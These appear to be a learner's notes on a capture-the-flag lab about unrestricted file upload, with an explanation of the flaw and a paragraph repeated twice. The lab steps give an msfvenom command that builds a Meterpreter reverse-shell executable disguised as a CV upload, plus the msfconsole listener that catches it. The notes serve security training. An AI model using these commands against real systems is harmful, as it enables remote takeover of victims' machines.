
## Input Validation

Insufficient input validation is one of the biggest security concerns for web applications. The issue occurs when user-provided input is inherently trusted by the application. Since user input can also be controlled by an attacker, we can see how this inherent trust can lead to many problems. Several web application vulnerabilities, such as SQL Injection, Cross Site Scripting, and Unrestricted File Upload, stem from the issue of insufficient user input validation. This task will focus on how insufficient input validation can lead to an Unrestricted File Upload vulnerability.

### Learning Objectives

-   Input validation of file upload funtionality
-   Unrestricted file upload vulnerabilities
-   Phishing through file uploads
-   How to properly secure file upload functionality

The _Unrestricted_ in Unrestricted File Uploads

The ability to upload files to a server has become integral to how we interact with web applications. Just think of file uploads like a profile picture for a social media website, a report being uploaded to cloud storage, or saving a project on GitHub; the applications for file upload features are limitless.  
  
Unfortunately, when poorly handled, file uploads can also open up severe vulnerabilities in the server. This can lead to anything from relatively minor nuisance problems; all the way up to full Remote Code Execution (RCE) if an attacker manages to upload and execute a shell. With unrestricted upload access to a server (and the ability to retrieve data at will), an attacker could deface or otherwise alter existing content -- up to and including injecting malicious webpages, which lead to further vulnerabilities such as Cross-Site Scripting (XSS) or Cross-Site Request Forgery (CSRF). By uploading arbitrary files, an attacker could potentially use the server to host and/or serve illegal content or to leak sensitive information. Realistically speaking, an attacker with the ability to upload a file of their choice to your server -- with no restrictions -- is very dangerous indeed.

Unrestricted File Uploads usually have two main exploitation paths:

-   If the attacker can retrieve the uploaded file, it could lead to code execution if the attacker uploads a file such as a web shell.
-   If the file is viewed by a user, think of a CV application, then an attacker could embed malware in the uploaded file that would execute on the user's workstation once they view the file.

There has been quite a lot of focus on RCE through web shells in previous rooms, so in this task, we will focus on the latter exploitation path.

There has been quite a lot of focus on RCE through web shells in previous rooms, so in this task, we will focus on the latter exploitation path.

----
1.  Access the machine ![[Pasted image 20221226134015.png]]
2. created the payload in order that will be sent over
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=5559 -f exe -o cv-username.exe
```
The payload appears in the folder where the payload is created 
![[Pasted image 20221226135648.png]]

3. Create the reverse shell listenter 
```shell
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 5559; exploit"
```

need to check ifconfig if using openvpn to get the ip.

Once the shell is created can navigate to the the different DIR to discover important information
